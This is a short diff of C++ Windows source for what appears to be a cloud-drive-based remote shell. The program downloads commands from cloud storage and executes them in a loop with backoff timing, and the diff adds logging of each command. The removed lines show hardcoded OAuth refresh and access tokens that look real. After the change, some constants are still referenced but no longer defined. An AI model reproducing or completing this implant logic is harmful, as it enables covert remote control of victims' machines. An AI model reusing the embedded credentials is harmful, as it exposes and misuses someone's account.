@@ -1,20 +1,5 @@
-#if defined(_DEBUG)
-#define SPDLOG_ACTIVE_LEVEL SPDLOG_LEVEL_INFO
-#else
-#define SPDLOG_ACTIVE_LEVEL SPDLOG_LEVEL_OFF
-#endif
-
-#include <stdio.h>
-#include <iostream>
-#include <windows.h>
-#include <stack>
 #include "CloudFunctions.h"
-#include <spdlog/spdlog.h>
-#include <shellapi.h>
 
-#define INIT_REFRESH_TOKEN "1//09qovbp-KVHtrCgYIARAAGAkSNwF-L9IrJV5agfIi1su5-Sa73rjjSQfj6ZoVjqA7rwxzAAdkaqbCi-3kdZzzuB9INzLTLdqKjsE"
-#define INIT_ACCESS_TOKEN "ya29.a0ARW5m76PSG1VKsrhpmHMaikhzvSIB0z9JBwUctxhhpU42dX5HMB3y1Uwrj7RWNcPuputSFkvlirlLrVpbi6irFXXiySUDBmCjNQiWNGnj1rHugn09-O8GrFGOq97yHCmmG0Xuru2KwWSrtlP8jq8O8vZ1wVRJLoBf6RwEcNmaCgYKATESARASFQHGX2Mi-_cF5hmjDXXo1hyELb0lJg0175"
-#define SLEEP_TIME_THRESHOLD 3125 // 5 ^ 5
 
 int Odd_Num() {
 	int result = rand();
@@ -22,12 +7,6 @@ int Odd_Num() {
 		return result;
 	else
 		return result - 1;
-}
-
-int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow) {
-
-	MessageBoxA(NULL, "test", "test", 0);
-
 }
 
 int main() {
@@ -39,6 +18,7 @@ int main() {
 	DWORD lastIndex = 0, lastSubIndex = 0, tries = 0;
 	DWORD timeThreshold = 0;
 	WORD resCode = BDRIVE_OK;
+
 	states.push(STATE_DOWNLOADING);
 
 	accessToken = INIT_ACCESS_TOKEN;
@@ -98,7 +78,7 @@ int main() {
 			SPDLOG_INFO("Shell is in STATE_EXECUTING!");
 
 			states.pop();
-
+			SPDLOG_INFO("Command is: {}", data);
 			if (commandExecuter(data, data)) {
 				SPDLOG_WARN("Something unhandled happened!");
 				states.push(STATE_EXECUTING);
@@ -270,7 +250,7 @@ int main() {
 		}
 
 		// This is to not exceed the Time threshold
-		if (timeThreshold < SLEEP_TIME_THRESHOLD + 1)
+		if (timeThreshold < SLEEP_TIME_THRESHOLD)
 		{
 			timeThreshold = expo(5, tries);
 			SPDLOG_INFO("Time threshold is: {}", timeThreshold);
